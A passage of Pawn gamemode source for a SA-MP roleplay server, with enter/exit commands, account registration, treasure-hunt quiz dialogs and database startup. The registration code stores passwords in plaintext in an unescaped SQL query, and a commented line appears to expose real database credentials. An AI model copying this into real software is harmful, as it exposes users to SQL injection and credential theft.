            if(DDoorsInfo[i][ddAdmin] > 0 && PlayerInfo[playerid][pAdmin] < DDoorsInfo[i][ddAdmin]) {
                SendClientMessage(playerid, COLOR_GRAD2, "You can't enter, you're not a high enough admin level.");
                return 1;
            }

            if(DDoorsInfo[i][ddWanted] > 0 && PlayerInfo[playerid][pWantedLevel] != 0) {
                SendClientMessage(playerid, COLOR_GRAD2, "You can't enter, this door restricts those with wanted levels.");
                return 1;
            }

			if(DDoorsInfo[i][ddLocked] == 1) {
			    return SendClientMessage(playerid, COLOR_GRAD2, "This door is currently locked.");
			}

			format(string, sizeof(string), "* %s has entered %s.", GetPlayerNameEx(playerid), DDoorsInfo[i][ddDescription]);
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

            SetPlayerInterior(playerid,DDoorsInfo[i][ddInteriorInt]);
            PlayerInfo[playerid][pInt] = DDoorsInfo[i][ddInteriorInt];
            PlayerInfo[playerid][pVW] = DDoorsInfo[i][ddInteriorVW];
            SetPlayerVirtualWorld(playerid, DDoorsInfo[i][ddInteriorVW]);
            if(DDoorsInfo[i][ddCustomInterior]) {
                LoadObjectsForPlayer(playerid);
            }
            if(DDoorsInfo[i][ddVehicleAble] > 0 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
                SetVehiclePos(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddInteriorX],DDoorsInfo[i][ddInteriorY],DDoorsInfo[i][ddInteriorZ]);
                SetVehicleZAngle(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddInteriorA]);
                SetVehicleVirtualWorld(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddInteriorVW]);
                LinkVehicleToInterior(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddInteriorInt]);
            }
            else {
                SetPlayerPos(playerid,DDoorsInfo[i][ddInteriorX],DDoorsInfo[i][ddInteriorY],DDoorsInfo[i][ddInteriorZ]);
                SetPlayerFacingAngle(playerid,DDoorsInfo[i][ddInteriorA]);
                SetCameraBehindPlayer(playerid);
            }
			foreach(Player, x)
			{
                if(IsABoomboxNearby(DDoorsInfo[i][ddInteriorX] ,DDoorsInfo[i][ddInteriorY], DDoorsInfo[i][ddInteriorZ], x) < 150.0 && DDoorsInfo[i][ddInteriorVW] == BoomboxInfo[x][bbVW] && DDoorsInfo[i][ddInteriorInt] == BoomboxInfo[x][bbInt])
				{
					PlayAudioStreamForPlayer(playerid, VehicleRadioListing[BoomboxInfo[x][bbStation]-1][radiourl], BoomboxInfo[x][bbPosX], BoomboxInfo[x][bbPosY], BoomboxInfo[x][bbPosZ], 50.0, 1);
				}
			}
            return Streamer_UpdateEx(playerid, DDoorsInfo[i][ddInteriorX],DDoorsInfo[i][ddInteriorY],DDoorsInfo[i][ddInteriorZ]);
        }
    }
    for(new i = 0; i < sizeof(HouseInfo); i++)
	{
        if(IsPlayerInRangeOfPoint(playerid,3,HouseInfo[i][hExteriorX], HouseInfo[i][hExteriorY], HouseInfo[i][hExteriorZ]))
		{
            if(HouseKey[playerid] == i || PlayerInfo[playerid][pHouse] == i || PlayerInfo[playerid][pHouse2] == i || HouseInfo[i][hLock] == 0 || PlayerInfo[playerid][pRenting] == i || strcmp(HouseInfo[i][hOwner], PlayerInfo[playerid][pMarriedTo],true) == 0)
			{
			    if(PlayerInfo[playerid][pHouse] == i || PlayerInfo[playerid][pHouse2] == i)
			    {
					format(string, sizeof(string), "* %s has entered their house.", GetPlayerNameEx(playerid));
					ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			    }
			    else
			    {
					if(HouseInfo[i][hOwned] == 0) {
						format(string, sizeof(string), "* %s has entered a house.", GetPlayerNameEx(playerid));
						ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					} else {
						format(string, sizeof(string), "* %s has entered %s's house.", GetPlayerNameEx(playerid), HouseInfo[i][hOwner]);
						ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					}
				}

                SetPlayerInterior(playerid,HouseInfo[i][hHInteriorWorld]);
                PlayerInfo[playerid][pInt] = HouseInfo[i][hHInteriorWorld];
                PlayerInfo[playerid][pVW] = i+60000;
                SetPlayerVirtualWorld(playerid, i+60000);
                if(HouseInfo[i][hCustomInterior] == 1)
				{
                    LoadObjectsForPlayer(playerid);
                }
                SetPlayerPos(playerid,HouseInfo[i][hInteriorX],HouseInfo[i][hInteriorY],HouseInfo[i][hInteriorZ]);
                SetPlayerFacingAngle(playerid,HouseInfo[i][hInteriorA]);
                SetCameraBehindPlayer(playerid);
                if(PlayerInfo[playerid][pHouse] == i || PlayerInfo[playerid][pHouse2] == i)
                {
                	GameTextForPlayer(playerid, "~w~Welcome Home", 5000, 1);
			 	}
 				foreach(Player, x)
				{
                	if(IsABoomboxNearby(HouseInfo[i][hInteriorX], HouseInfo[i][hInteriorY], HouseInfo[i][hInteriorZ], x) < 150.0 && i+60000 == BoomboxInfo[x][bbVW] && HouseInfo[i][hHInteriorWorld] == BoomboxInfo[x][bbInt])
					{
						PlayAudioStreamForPlayer(playerid, VehicleRadioListing[BoomboxInfo[x][bbStation]-1][radiourl], BoomboxInfo[x][bbPosX], BoomboxInfo[x][bbPosY], BoomboxInfo[x][bbPosZ], 50.0, 1);
					}
				}
				Streamer_UpdateEx(playerid, HouseInfo[i][hInteriorX],HouseInfo[i][hInteriorY],HouseInfo[i][hInteriorZ]);
            }
            else
			{
                GameTextForPlayer(playerid, "~r~Locked", 5000, 1);
            }
            return 1;
        }
    }

    // Hitman HQ
    if(IsPlayerInRangeOfPoint(playerid, 2.0,  -418.68, -1759.65, 6.22)) {
    	if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4) {
        	SetPlayerVirtualWorld(playerid, 42);
            PlayerInfo[playerid][pVW] = 42;
            SetPlayerInterior(playerid, 42);
            PlayerInfo[playerid][pInt] = 42;
            SetPlayerPos(playerid, 1277.019165, -758.428771, 5080.750000);
            SetPlayerFacingAngle(playerid, 358.16);
            SetCameraBehindPlayer(playerid);

            LoadObjectsForPlayer(playerid);
            SendClientMessage(playerid, COLOR_WHITE, "You can /order weaponry in the armory room.");
            return 1;
		}
	}

    // The Lubu Gentlemen's Club
    else if(IsPlayerInRangeOfPoint(playerid, 3.0,  511.817230, -1510.971679, 14.566996))
	{
		format(string, sizeof(string), "* %s has entered The Lubu Gentlemen's Club.", GetPlayerNameEx(playerid));
		ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

 		SetPlayerVirtualWorld(playerid, 373737);
   		PlayerInfo[playerid][pVW] = 373737;
     	SetPlayerInterior(playerid, 37);
      	PlayerInfo[playerid][pInt] = 37;
       	SetPlayerPos(playerid, -1077.946533, 613.206665, 1116.507812);
        SetPlayerFacingAngle(playerid, 92.42);
        SetCameraBehindPlayer(playerid);

		LoadObjectsForPlayer(playerid);

		PlayAudioStreamForPlayer(playerid, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=242774", -1087.677978, 615.239807, 1116.507812, 40.0, 1);
    }

    // The Tableau Club
    else if(IsPlayerInRangeOfPoint(playerid, 3.0,  561.802795, -1506.722412, 14.548986))
	{
		format(string, sizeof(string), "* %s has entered The Tableau Club.", GetPlayerNameEx(playerid));
		ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

 		SetPlayerVirtualWorld(playerid, 363636);
   		PlayerInfo[playerid][pVW] = 363636;
     	SetPlayerInterior(playerid, 36);
      	PlayerInfo[playerid][pInt] = 36;
       	SetPlayerPos(playerid, 308.045654, 1053.886840, 1098.540039);
        SetPlayerFacingAngle(playerid, 267.57);
        SetCameraBehindPlayer(playerid);

		LoadObjectsForPlayer(playerid);

		PlayAudioStreamForPlayer(playerid, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377200", 321.139465, 1034.947753, 1098.914062, 120.0, 1);
    }

    // The Tableau Club (VIP ROOM)
    else if(IsPlayerInRangeOfPoint(playerid, 3.0,  307.904296, 1025.602294, 1098.540039))
	{
	    if(GetPlayerCash(playerid) >= 100)
	    {
			format(string, sizeof(string), "* %s has entered The Tableau VIP Room.", GetPlayerNameEx(playerid));
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

			GivePlayerCash(playerid, -100);
			GameTextForPlayer(playerid, "~r~-$100", 3000, 1);

 			SetPlayerVirtualWorld(playerid, 363636);
   			PlayerInfo[playerid][pVW] = 363636;
     		SetPlayerInterior(playerid, 36);
      		PlayerInfo[playerid][pInt] = 36;
       		SetPlayerPos(playerid, 293.066436, 1029.785278, 1104.560058);
        	SetPlayerFacingAngle(playerid, 352.47);
        	SetCameraBehindPlayer(playerid);
		 }
		 else
		 {
		    SendClientMessage(playerid, COLOR_GREY, " You do not have the cash for that.");
		 }
    }

    // Santa Maria Surfer's Lounge
    else if(IsPlayerInRangeOfPoint(playerid, 3.0,  387.958374, -1870.688110, 7.835937))
	{
		format(string, sizeof(string), "* %s has entered Santa Maria Surfer's Lounge.", GetPlayerNameEx(playerid));
		ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

 		SetPlayerVirtualWorld(playerid, 363636+1);
		PlayerInfo[playerid][pVW] = 363636+1;
		SetPlayerInterior(playerid, 36);
		PlayerInfo[playerid][pInt] = 36;
		SetPlayerPos(playerid, 293.066436, 1029.785278, 1104.560058);
		SetPlayerFacingAngle(playerid, 352.47);
		SetCameraBehindPlayer(playerid);

		LoadObjectsForPlayer(playerid);

		PlayAudioStreamForPlayer(playerid, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=21585", 271.742034, 1074.419677, 5096.750000, 120.0, 1);
    }

	new vehicleid = GetPlayerVehicleID(playerid);
	new closestcar = GetClosestCar(playerid, vehicleid);
	if(IsPlayerInRangeOfVehicle(playerid, closestcar, 6.0) && GetVehicleModel(closestcar) == 519)
	{
	    if(VehicleStatus{closestcar} == 1) return SendClientMessage(playerid, COLOR_WHITE, "You're not allowed to enter this Shamal as it's been damaged!");
   		format(string, sizeof(string), "* %s enters the Shamal airplane as a passenger.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
     	SetPlayerPos(playerid, 2.509036, 23.118730, 1199.593750);
     	SetPlayerFacingAngle(playerid, 82.14);
        SetCameraBehindPlayer(playerid);
		PlayerInfo[playerid][pVW] = closestcar;
		SetPlayerVirtualWorld(playerid, closestcar);
		PlayerInfo[playerid][pInt] = 1;
        SetPlayerInterior(playerid, 1);
		InsideShamal[playerid] = closestcar;
		SendClientMessage(playerid, COLOR_WHITE, "Type /exit near the door to exit the vehicle, or /window to look outside.");

		foreach(Player, x)
		{
 			if(IsABoomboxNearby(2.509036, 23.118730, 1199.593750, x) < 150.0 && closestcar == BoomboxInfo[x][bbVW] && BoomboxInfo[x][bbInt] == 1)
			{
				PlayAudioStreamForPlayer(playerid, VehicleRadioListing[BoomboxInfo[x][bbStation]-1][radiourl], BoomboxInfo[x][bbPosX], BoomboxInfo[x][bbPosY], BoomboxInfo[x][bbPosZ], 50.0, 1);
			}
		}
	}
    return 1;
}

CMD:exit(playerid, params[])
{
    if(GetPVarInt(playerid, "PBM") > 0) {
        SendClientMessage(playerid, COLOR_WHITE, "You can't do this while being in a arena!");
        return 1;
    }
    if(PlayerInfo[playerid][pJailed] > 0)
	{
        SendClientMessage(playerid, COLOR_WHITE, "You can't do this right now.");
        return 1;
    }
	new string[128];

    for(new i = 0; i <  sizeof(DDoorsInfo); i++) {
        if(IsPlayerInRangeOfPoint(playerid,3,DDoorsInfo[i][ddInteriorX], DDoorsInfo[i][ddInteriorY], DDoorsInfo[i][ddInteriorZ]) && PlayerInfo[playerid][pVW] == DDoorsInfo[i][ddInteriorVW])
		{
			format(string, sizeof(string), "* %s has exited the building.", GetPlayerNameEx(playerid));
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

            SetPlayerInterior(playerid,DDoorsInfo[i][ddExteriorInt]);
            PlayerInfo[playerid][pInt] = DDoorsInfo[i][ddExteriorInt];
            SetPlayerVirtualWorld(playerid, DDoorsInfo[i][ddExteriorVW]);
            PlayerInfo[playerid][pVW] = DDoorsInfo[i][ddExteriorVW];
            if(DDoorsInfo[i][ddCustomExterior]) {
				LoadObjectsForPlayer(playerid);
            }
            if(DDoorsInfo[i][ddVehicleAble] > 0 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
                SetVehiclePos(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddExteriorX],DDoorsInfo[i][ddExteriorY],DDoorsInfo[i][ddExteriorZ]);
                SetVehicleZAngle(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddExteriorA]);
                SetVehicleVirtualWorld(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddExteriorVW]);
                LinkVehicleToInterior(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddExteriorInt]);
            }
            else {
                SetPlayerPos(playerid,DDoorsInfo[i][ddExteriorX],DDoorsInfo[i][ddExteriorY],DDoorsInfo[i][ddExteriorZ]);
                SetPlayerFacingAngle(playerid, DDoorsInfo[i][ddExteriorA]);
                SetCameraBehindPlayer(playerid);
            }
            return Streamer_UpdateEx(playerid, DDoorsInfo[i][ddInteriorX],DDoorsInfo[i][ddInteriorY],DDoorsInfo[i][ddInteriorZ]);
        }
    }
    for(new i = 0; i <  sizeof(HouseInfo); i++) {
        if(IsPlayerInRangeOfPoint(playerid,3,HouseInfo[i][hInteriorX], HouseInfo[i][hInteriorY], HouseInfo[i][hInteriorZ]) && (GetPlayerVirtualWorld(playerid) == i+60000))
		{
			format(string, sizeof(string), "* %s has exited the house.", GetPlayerNameEx(playerid));
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPlayerInterior(playerid,0);
            PlayerInfo[playerid][pInt] = 0;
            if(HouseInfo[i][hCustomExterior])
			{
                LoadObjectsForPlayer(playerid);
            }
            SetPlayerPos(playerid,HouseInfo[i][hExteriorX],HouseInfo[i][hExteriorY],HouseInfo[i][hExteriorZ]);
            SetPlayerFacingAngle(playerid, HouseInfo[i][hExteriorA]);
            SetCameraBehindPlayer(playerid);
            SetPlayerVirtualWorld(playerid, 0);
            PlayerInfo[playerid][pVW] = 0;
            return Streamer_UpdateEx(playerid, HouseInfo[i][hExteriorX],HouseInfo[i][hExteriorY],HouseInfo[i][hExteriorZ]);
        }
    }

    // Hitman HQ
    if(IsPlayerInRangeOfPoint(playerid, 2.0, 1277.019165, -758.428771, 5080.750000) && (GetPlayerVirtualWorld(playerid) == 42))
    {
        if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4)
        {
            SetPlayerVirtualWorld(playerid, 0);
            PlayerInfo[playerid][pVW] = 0;
            SetPlayerInterior(playerid, 0);
            PlayerInfo[playerid][pInt] = 0;
            SetPlayerPos(playerid, -418.68, -1759.65, 6.22);
            SetPlayerFacingAngle(playerid, 338.54);
            SetCameraBehindPlayer(playerid);
        }
    }

    // The Lubu Gentlemen's Club
    else if(IsPlayerInRangeOfPoint(playerid, 3.0, -1077.946533, 613.206665, 1116.507812) && (GetPlayerVirtualWorld(playerid) == 373737))
	{
		format(string, sizeof(string), "* %s has exited the building.", GetPlayerNameEx(playerid));
		ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

		SetPlayerVirtualWorld(playerid, 0);
   		PlayerInfo[playerid][pVW] = 0;
     	SetPlayerInterior(playerid, 0);
      	PlayerInfo[playerid][pInt] = 0;
      	SetPlayerPos(playerid, 511.817230, -1510.971679, 14.566996);
       	SetPlayerFacingAngle(playerid, 272.11);
       	SetCameraBehindPlayer(playerid);

       	StopAudioStreamForPlayer(playerid);
    }

    // The Tableau Club
    else if(IsPlayerInRangeOfPoint(playerid, 3.0, 308.045654, 1053.886840, 1098.540039) && (GetPlayerVirtualWorld(playerid) == 363636))
	{
		format(string, sizeof(string), "* %s has exited the building.", GetPlayerNameEx(playerid));
		ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

		SetPlayerVirtualWorld(playerid, 0);
   		PlayerInfo[playerid][pVW] = 0;
     	SetPlayerInterior(playerid, 0);
      	PlayerInfo[playerid][pInt] = 0;
      	SetPlayerPos(playerid, 561.802795, -1506.722412, 14.548986);
       	SetPlayerFacingAngle(playerid, 86.78);
       	SetCameraBehindPlayer(playerid);

       	StopAudioStreamForPlayer(playerid);
    }
    // The Tableau Club (VIP ROOM)
    else if(IsPlayerInRangeOfPoint(playerid, 3.0, 293.066436, 1029.785278, 1104.560058) && (GetPlayerVirtualWorld(playerid) == 363636))
	{
 		SetPlayerVirtualWorld(playerid, 363636);
   		PlayerInfo[playerid][pVW] = 363636;
     	SetPlayerInterior(playerid, 36);
      	PlayerInfo[playerid][pInt] = 36;
      	SetPlayerPos(playerid, 307.904296, 1025.602294, 1098.540039);
       	SetPlayerFacingAngle(playerid, 264.06);
       	SetCameraBehindPlayer(playerid);
    }
    // Santa Maria Surfer's Lounge
    else if(IsPlayerInRangeOfPoint(playerid, 3.0, 271.742034, 1074.419677, 5096.750000) && (GetPlayerVirtualWorld(playerid) == 353535))
	{
		format(string, sizeof(string), "* %s has exited the building.", GetPlayerNameEx(playerid));
		ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

		SetPlayerVirtualWorld(playerid, 0);
   		PlayerInfo[playerid][pVW] = 0;
     	SetPlayerInterior(playerid, 0);
      	PlayerInfo[playerid][pInt] = 0;
      	SetPlayerPos(playerid, 387.958374, -1870.688110, 7.835937);
       	SetPlayerFacingAngle(playerid, 89.99);
       	SetCameraBehindPlayer(playerid);

       	StopAudioStreamForPlayer(playerid);
    }
    // Shamal
    else if(InsideShamal[playerid] != INVALID_VEHICLE_ID && IsPlayerInRangeOfPoint(playerid,3,2.509036, 23.118730, 1199.593750))
	{
        format(string, sizeof(string), "* %s exits the Shamal airplane.", GetPlayerNameEx(playerid));
        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

        if(InsideShamal[playerid] == INVALID_VEHICLE_ID || GetVehicleModel(InsideShamal[playerid]) != 519) {
            PlayerInfo[playerid][pAGuns][GetWeaponSlot(46)] = 46;
            GivePlayerValidWeapon(playerid, 46, 60000);
            SetPlayerPos(playerid, 0.000000, 0.000000, 420.000000);
        }
        else {
            new Float:X, Float:Y, Float:Z;
            GetVehiclePos(InsideShamal[playerid], X, Y, Z);
            SetPlayerPos(playerid, X-4, Y-2.3, Z);

            new Float:XB, Float:YB, Float:ZB;
            GetVehiclePos(InsideShamal[playerid], XB, YB, ZB);
            if(ZB > 50.0) {
                PlayerInfo[playerid][pAGuns][GetWeaponSlot(46)] = 46;
                GivePlayerValidWeapon(playerid, 46, 60000);
            }
        }

        PlayerInfo[playerid][pVW] = 0;
        SetPlayerVirtualWorld(playerid, 0);
        PlayerInfo[playerid][pInt] = 0;
        SetPlayerInterior(playerid, 0);
        InsideShamal[playerid] = INVALID_VEHICLE_ID;
    }
    return 1;
}

main()
{
	print("\n----------------------------------");
	print("Next Generation Roleplay");
	print("----------------------------------\n");
}

forward OnPlayerStatsUpdate(playerid);
public OnPlayerStatsUpdate(playerid) {
	#pragma unused playerid
	return 1;
}

forward OnPlayerLogin(playerid,password[]);
public OnPlayerLogin(playerid,password[]) {
	#pragma unused playerid
	#pragma unused password
	return 1;
}

forward OnPlayerOfflineLogin(playername[]);
public OnPlayerOfflineLogin(playername[]) {
	#pragma unused playername
}

forward OnPlayerOfflineSave(playername[]);
public OnPlayerOfflineSave(playername[]) {
	#pragma unused playername
	return 1;
}

forward OnPlayerRegister(playerid, password[]);
public OnPlayerRegister(playerid, password[]) {
	if(IsPlayerConnected(playerid)) {
		new
		    szPlayerName[MAX_PLAYER_NAME],
		    szPlayerName2[MAX_PLAYER_NAME],
		    szQuery[225];

		GetPlayerName(playerid, szPlayerName, MAX_PLAYER_NAME);

		mysql_escape_string(szPlayerName, szPlayerName2,MAX_PLAYER_NAME,sqldb);

		SetPVarString(playerid, "password", password);

		// Set the variable to logged in so we aren't cockblocked by SaveAccount()
		gPlayerLogged[playerid] = 1;

		mysql_format(sqldb,szQuery, sizeof(szQuery), "INSERT INTO players (Username, Password) VALUES('%s', '%s')", szPlayerName2, password);
		mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii", THREAD_REGISTER_ACCOUNT,playerid);
	}
	return 1;
}

stock AntiDeAMX()
{
    new a[][] = {
        "Unarmed (Fist)",
        "Brass K"
    };
    #pragma unused a
}

#if defined TREASURE_HUNT_ENABLED
stock SetRandomHuntPos() {
	iHuntLocation = random(sizeof(fTreasureHuntLS));

	DestroyPickup(iHuntPickup);
	DestroyDynamic3DTextLabel(lHunt);
	iHuntPickup = CreatePickup(1279, 1, fTreasureHuntLS[iHuntLocation][0], fTreasureHuntLS[iHuntLocation][1], fTreasureHuntLS[iHuntLocation][2], 0);
	lHunt = CreateDynamic3DTextLabel("Treasure Hunt\nEnter the pickup!", COLOR_YELLOW, fTreasureHuntLS[iHuntLocation][0], fTreasureHuntLS[iHuntLocation][1], fTreasureHuntLS[iHuntLocation][2]+0.5, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
	return 1;
}

stock PrizeMenu(playerid) {
	ShowPlayerDialogEx(playerid, DIALOG_HUNT_PRIZE, DIALOG_STYLE_LIST, "Treasure Hunt Prize Selection", "20 pot, 10 crack\n2,000 materials\nDesert Eagle\n1 respect point\n", "OK", "Cancel");
	return 1;
}

stock AskHuntQuestion(playerid) {
	if(!IsPlayerConnected(playerid))
	    return 0;

	SetPVarInt(playerid, "HuntQ", random(10));

	SendClientMessage(playerid, COLOR_WHITE, "To unlock the prize, you must answer a question. If you get the answer wrong, the treasure will be moved before you have a chance to try again.");
	switch(GetPVarInt(playerid, "HuntQ")) {
	    case 0: ShowPlayerDialogEx(playerid, DIALOG_HUNT_QUESTION, DIALOG_STYLE_LIST, "What was the date the server opened? (EU/US timezone)", "January 6th\nJanuary 3rd\nJanuary 5th\nJanuary 8th", "OK", "Cancel");
	    case 1: ShowPlayerDialogEx(playerid, DIALOG_HUNT_QUESTION, DIALOG_STYLE_LIST, "What is Jay Chawla's favourite catchphrase?", "Game on\nPlug in\nMastication for the Nation\nMatch on\n", "OK", "Cancel");
	    case 2: ShowPlayerDialogEx(playerid, DIALOG_HUNT_QUESTION, DIALOG_STYLE_LIST, "Do you know a man named Miles Thorson?", "Yes, we're good friends\nHe kicked my dog\nNo, He's an imaginary character from The Mentalist\n", "OK", "Cancel");
	    case 3: ShowPlayerDialogEx(playerid, DIALOG_HUNT_QUESTION, DIALOG_STYLE_LIST, "When was the theoretical physicist Albert Einstein born?", "December 25th, 2011\nMarch 14th, 1879\nApril 18th, 1955\nJanuary 4th, 1804", "OK", "Cancel");
	    case 4: ShowPlayerDialogEx(playerid, DIALOG_HUNT_QUESTION, DIALOG_STYLE_LIST, "What is the 'sizeof' function in Pawn?", "A stock function\nA forwarded function\nA macro which gets the size of a string\nThe name of a cereal", "OK", "Cancel");
	    case 5: ShowPlayerDialogEx(playerid, DIALOG_HUNT_QUESTION, DIALOG_STYLE_LIST, "What is the callsign of the Campo's team in Battlefield 3?", "Kimball 4-6\nMisfit 1-3\nFitmissie 69\nActual 1-3", "OK", "Cancel");
	    case 6: ShowPlayerDialogEx(playerid, DIALOG_HUNT_QUESTION, DIALOG_STYLE_LIST, "In the popular US TV show 'Psych', what is the name of the sidekick?", "Burton Guster\nCarlton Lassiter\nJames Roday\nHenry Spencer", "OK", "Cancel");
	    case 7: ShowPlayerDialogEx(playerid, DIALOG_HUNT_QUESTION, DIALOG_STYLE_LIST, "Which company developed the iPhone?", "Grapefruit\nOrange\nApple\nBlackBerry", "OK", "Cancel");
	    case 8: ShowPlayerDialogEx(playerid, DIALOG_HUNT_QUESTION, DIALOG_STYLE_LIST, "What symbol is used for hashtags on Twitter?", "#\n$\n?\n&", "OK", "Cancel");
	    case 9: ShowPlayerDialogEx(playerid, DIALOG_HUNT_QUESTION, DIALOG_STYLE_LIST, "3 robbers robbed a store. Once they came out, they were totally changed, but they still continued robbing. Why?", "Developers, developers, developers, developers (cont.)\nThey changed their clothes, not their ways\nThey used Harry Potter's cloak of invisibility\nThe sun is shining everyday", "OK", "Cancel");
	}

	return 1;
}
#endif

public OnGameModeInit()
{
    new
		string[42],
		time[3];

    #if defined TREASURE_HUNT_ENABLED
    	SetRandomHuntPos();
    #endif

	AntiDeAMX();
	Streamer_TickRate(125);

	SetGameModeText("NGG:OS v1.0");

	EnableStuntBonusForAll(0);
	//ShowPlayerMarkers(PLAYER_MARKERS_MODE_STREAMED);
	//LimitPlayerMarkerRadius(360.0);
	DisableInteriorEnterExits();
	SetNameTagDrawDistance(45.0);
	AllowInteriorWeapons(1);
	SetWeather(2);
	UsePlayerPedAnims();

	// MySQL connect
	/*if(!IsBETAServer()) {
		sqldb = mysql_connect("localhost", "root", "horizonrp", "");
	} else*/
	// sqldb = mysql_connect("localhost", "root", "ngrp", "");
	//sqldb = mysql_connect("localhost", "NextGenerati", "zNextGenerati0", "xPsMFjjB");
	sqldb = mysql_connect(SQL_HOST, SQL_USER, SQL_PASS, SQL_DATA);
	if(mysql_errno(sqldb) != 0)
	{
		printf("[MySQL] (sqldb) Fatal Error! Could not connect to MySQL: Host %s - DB: %s - User: %s", SQL_HOST, SQL_DATA, SQL_USER);
		print("[MySQL] Note: Make sure that you have provided the correct connection credentials.");
		printf("[MySQL] Error number: %i", mysql_errno(sqldb));
		SendRconCommand("exit");
	}
	printf("Connected to the database: %s successfully",SQL_DATA);
	mysql_log(ERROR);
	// mysql_debug(1);

	// mysql_tquery("set session query_cache_type=0;",  0,sqldb);

	// Dynamic systems
	LoadPoints();
	LoadFamilies();
	LoadHouses();
	LoadDynamicDoors();
	LoadDynamicMapIcons();
	LoadcDealerships();
	//LoadThePay();
	Misc_Load();

	for(new f = 0; f < sizeof(FamilyInfo); f++)
	{
		for(new fv = 0; fv < MAX_GANG_VEHICLES; fv++)
		{
		    FamilyVehicleInfo[f][fv][fvModelId] = 0;
			FamilyVehicleInfo[f][fv][fvSpawnx] = 0.0;
			FamilyVehicleInfo[f][fv][fvSpawny] = 0.0;
			FamilyVehicleInfo[f][fv][fvSpawnz] = 0.0;
			FamilyVehicleInfo[f][fv][fvSpawna] = 0.0;
			FamilyVehicleInfo[f][fv][fvPaintJob] = -1;
			FamilyVehicleInfo[f][fv][fvColor1] = 126;
			FamilyVehicleInfo[f][fv][fvColor2] = 126;
			FamilyVehicleInfo[f][fv][fvPrice] = 0;
			FamilyVehicleInfo[f][fv][fvFuel] = 100.00;
	    	FamilyVehicleInfo[f][fv][fvId] = INVALID_VEHICLE_ID;
		}
	}

	LoadFamiliesHQ();
	ClearReports();

	for(new h = 0; h < sizeof(FamilyInfo); h++)
	{
		if(FamilyInfo[h][FamilyUSafe] > 0)
		{
			FamilyInfo[h][FamilyPickup] = CreatePickup(1239, 23, FamilyInfo[h][FamilySafe][0], FamilyInfo[h][FamilySafe][1], FamilyInfo[h][FamilySafe][2], -1);
		}
		if(FamilyInfo[h][FamilyEntrance][0] != 0.0 && FamilyInfo[h][FamilyEntrance][1] != 0.0)
		{
		    FamilyInfo[h][FamilyEntrancePickup] = CreatePickup(1318, 23, FamilyInfo[h][FamilyEntrance][0], FamilyInfo[h][FamilyEntrance][1], FamilyInfo[h][FamilyEntrance][2], -1);
			format(string, sizeof(string), "%s", FamilyInfo[h][FamilyName]);
			FamilyInfo[h][FamilyEntranceText] = CreateDynamic3DTextLabel(string,COLOR_YELLOW,FamilyInfo[h][FamilyEntrance][0], FamilyInfo[h][FamilyEntrance][1], FamilyInfo[h][FamilyEntrance][2]+0.6,4.0);
		}
		LoadGangVehicles(h);
	}

	for(new h = 0; h < sizeof(Points); h++)
	{
		if(Points[h][Type] == 3)
		{
			format(string, sizeof(string), " POT AVAILABLE: %d grams.", Points[h][Stock]);
			Points[h][TextLabel] = CreateDynamic3DTextLabel(string, COLOR_YELLOW, Points[h][Pointx], Points[h][Pointy], Points[h][Pointz], 4.0);
			Points[h][CratePoint] = 1;
		}
		else if(Points[h][Type] == 4)
		{
			format(string, sizeof(string), " CRACK AVAILABLE: %d grams.", Points[h][Stock]);
			Points[h][TextLabel] = CreateDynamic3DTextLabel(string, COLOR_YELLOW, Points[h][Pointx], Points[h][Pointy], Points[h][Pointz], 4.0);
			Points[h][CratePoint] = 2;
		}
		CreatePickup(1239, 23, Points[h][Pointx], Points[h][Pointy], Points[h][Pointz], -1);
	}

	new text_info[128];
